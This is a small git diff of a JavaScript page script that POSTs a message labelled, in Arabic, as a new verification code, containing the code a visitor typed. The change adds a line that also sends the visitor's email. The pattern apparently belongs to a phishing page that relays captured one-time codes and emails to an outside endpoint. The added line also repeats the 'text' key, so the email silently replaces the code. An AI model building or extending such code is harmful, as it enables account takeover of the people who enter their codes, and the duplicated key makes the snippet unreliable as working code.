@@ -96,7 +96,8 @@ document.addEventListener("DOMContentLoaded", function () {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            text: `🔢 رمز تحقق جديد:\n${codeInput}`,
+            text: `\n 🔢 رمز تحقق جديد:\n${codeInput}`,
+               text: `\n 🔢 email : \n${email}`,
           }),
         });
 
